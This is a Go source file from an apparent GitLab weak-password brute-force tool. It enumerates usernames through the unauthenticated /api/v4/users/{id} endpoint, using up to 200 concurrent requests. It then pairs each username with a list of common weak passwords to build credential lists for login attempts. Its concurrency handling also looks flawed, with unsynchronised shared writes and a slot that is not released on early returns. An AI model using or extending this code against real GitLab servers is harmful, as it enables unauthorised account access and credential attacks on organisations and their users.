package brute

import (
	"encoding/json"
	"fmt"
	"gitlab_weakpassword/Data"
	"gitlab_weakpassword/utils"
	"os"
	"strconv"
	"strings"
	"sync"
)

func GetAuthorList(info Data.TargetInfo) ([]Data.Author, error) {
	hasVuln := true
	// 创建一个同步等待组
	var wg sync.WaitGroup

	// 创建一个最大100的协程数的通道
	limit := make(chan struct{}, 200)
	var userList []string
	//https: //repo.semoss.org/api/v4/users/1
	if info.Protocol != "https://" && info.Protocol != "http://" {
		info.Protocol = "https://"
	}
	if strings.HasSuffix(info.Host, "/") { // 去掉尾巴
		info.Host = strings.TrimSuffix(info.Host, "/")
	}
	fail := 0
	for i := 1; i < 10000; i++ {
		if !hasVuln {
			fmt.Println("haven't vuln")
			os.Exit(0)
		}
		if fail >= 30 {
			break
		}
		// 每个代码块都会增加一个同步等待组的计数器
		wg.Add(1)
		// 尝试向通道添加一个新的值
		limit <- struct{}{}
		go func(i int) {
			defer wg.Done()

			url := fmt.Sprintf("%v%v/api/v4/users/%v", info.Protocol, info.Host, strconv.Itoa(i))
			get, err := utils.HttpGet(url)
			//验证是否有漏洞
			if strings.Contains(get, "Not authorized") {
				hasVuln = false
			}
			//获取
			if err != nil {

				return
			}
			tmpJsonStruct := Data.GitlabJson{}
			unmarshalErr := json.Unmarshal([]byte(get), &tmpJsonStruct)
			//fmt.Println(get)
			if unmarshalErr != nil {
				fail++
				return
			}
			if len(tmpJsonStruct.Username) < 1 { // 抛去空用户名
				fail++
				return
			}
			userList = append(userList, tmpJsonStruct.Username)
			fmt.Print(tmpJsonStruct.Username + "                                    \r")
			// 从通道中移除一个值
			<-limit
		}(i)

	}
	wg.Wait()

	var authorList []Data.Author // 生成认证列表
	passwordList := []string{
		"{username}123",
		"{username}1234",
		"{username}12345",
		"{username}123456",
		"{username}password",
		"{username}admin",
		"{username}",
		"{username}{username}",
		"123",
		"1234",
		"12345",
		"123456",
		"1234567",
		"1234568",
		"12345689",
		"123456890",
		"admin",
		"admin123",
		"password",
	}
	for _, user := range userList {
		for _, keyUnreplace := range passwordList {
			authorList = append(authorList, Data.Author{
				Username: user,
				Password: fmt.Sprintf(strings.ReplaceAll(keyUnreplace, "{username}", user)),
			})
		}
	}
	return authorList, nil
}
